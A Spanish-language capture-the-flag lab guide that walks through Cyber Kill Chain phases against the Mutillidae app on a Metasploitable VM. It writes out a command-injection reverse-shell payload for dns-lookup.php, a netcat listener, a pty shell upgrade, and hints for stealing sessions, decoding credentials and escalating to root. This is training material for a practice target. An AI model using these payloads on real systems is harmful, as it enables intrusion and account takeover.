### Reto 2

## Objetivo

	¿Cual es el apellido Jakub?

## Referencias

## CEH v10

- Session Hijacking

## OWASP10.2017

- A1* Injection (Command)
- A6* Security Misconfiguration

** Antes de iniciar, recuerda hacer prueba de red y verificar los accesos a Mutillidae e Internet.

### CyberKillChain

## Reconocimento: 
- Reutiliza el reconocimiento anterior
- Jakub debe estar enlazado con Metasploitable
- Accede a Multillidae http://metasploitable/mutillidae

## Militarizacion:
- Ciclo del error: 
  - Reutiliza exploits funcionales (SQL injection).
  - Reutiliza el commando & control anterior.
  - Valida las versiones y los exploits a utilizar ¿Estas de acuerdo?
				 
- Exceso de seguridad (Totem): 
  - Reutiliza la confianza en una app vulnerable.
  - Confia en que el usuario realizara la busqueda correcta de DNS, y no ejecutara algun comando ¿Estas de acuerdo?	
  - Prepara el exploit correcto, para obtener un shell remoto, recuerda que dependes lo que acepte el servidor.
	** Netcat puede ser una opcion.

## Entrega:
- En espera de acciones en login.php
- En espera de acciones para acceder por cookies
- Valida la entrega en versiones vulnerables 
- Entrega en dns.lookup.php
- Prepara la recepcion en tu kali con
	$ nc -lvnp 1234
		
## Explotacion:
- Ingresa en la entrega dns-lookup.php
	&& rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc metasploitable 1234 >/tmp/f
- Obten un shell interactivo utilizando python.
	$ python -c 'import pty; pty.spawn("/bin/bash")'
- Busca algun dato sobre Jakub en la carpeta.
- Consigue el apellido haciendo Dorking, tendras el objetivo.
	
## Instalación:
- No se puede ejecutar nada desde www-data.
- Busca un archivo que te permita robar alguna sesion del servidor.
	** Quiza las siglas del equipo donde jugo su final de Champions ayude.
- Obtener la clave cifrada y prueba en CyberChef de github
	** Base64 / Hex / Base64
- Ingresa a msfadmin con:
	$ sudo 'usuario encontrado'
- Y la contraseña para tener acceso, nos instalaremos aqui, no generamos backdoor.
	
## Comando & Control:
- Salir de la sesion.
- Ingresa en la cuenta con las credenciales de SSH, y prueba el acceso a root.
		
## Acciones en el objetivo:
- En lista las versiones vulnerables que validaste en la entrega, y prepara los exploits.
- Si el login.php es vulnerable a SQL Injection, el login de user-info lo será? Qué obtenemos?
